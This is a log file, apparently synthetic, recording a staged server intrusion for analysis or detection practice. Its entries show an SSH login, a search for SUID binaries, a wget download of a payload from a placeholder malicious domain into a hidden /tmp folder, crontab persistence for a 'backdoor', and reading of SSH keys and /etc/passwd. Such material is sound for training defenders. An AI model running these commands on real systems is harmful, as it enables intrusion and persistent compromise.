timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
2023-01-01 08:15:00	auth	server1	INFO	admin	server1	185.27.134.12	sshd	1234	Accepted publickey for admin from 185.27.134.12 port 22 ssh2
2023-01-01 08:16:20	auth	server1	INFO	admin	server1	185.27.134.12	sudo	1235	admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -ls
2023-01-01 08:20:15	syslog	server1	INFO	admin	server1	185.27.134.12	bash	1236	Command executed: wget http://malicious-domain.com/payload.tgz -O /tmp/.hidden/payload.tgz
2023-01-01 08:22:30	syslog	server1	WARN	root	server1	185.27.134.12	bash	1237	Command executed: tar -xzf /tmp/.hidden/payload.tgz -C /tmp/.hidden/
2023-01-01 08:25:45	syslog	server1	WARN	root	server1	185.27.134.12	bash	1238	Command executed: chmod +x /tmp/.hidden/backdoor
2023-01-01 08:26:10	syslog	server1	WARN	root	server1	185.27.134.12	crontab	1239	root edited crontab entry: @reboot /tmp/.hidden/backdoor
2023-01-01 09:15:20	syslog	server1	WARN	root	server1	185.27.134.12	bash	1240	Command executed: find /etc/ssh -type f -name "*.pub" -exec cat {} \;
2023-01-01 10:30:45	syslog	server1	WARN	root	server1	185.27.134.12	bash	1241	Command executed: cat /etc/passwd > /tmp/.hidden/passwd.bak
2023-01-01 10:35:10	syslog	server1	WARN	root	server1	185.27.134.12	bash	1242	Command executed: netstat -antup > /tmp/.hidden/netstat.bak
2023-01-01 11:45:30	syslog	server1	WARN	root	server1	185.27.134.12	bash	1243	Command executed: nohup /tmp/.hidden/backdoor > /dev/null 2>&1 &
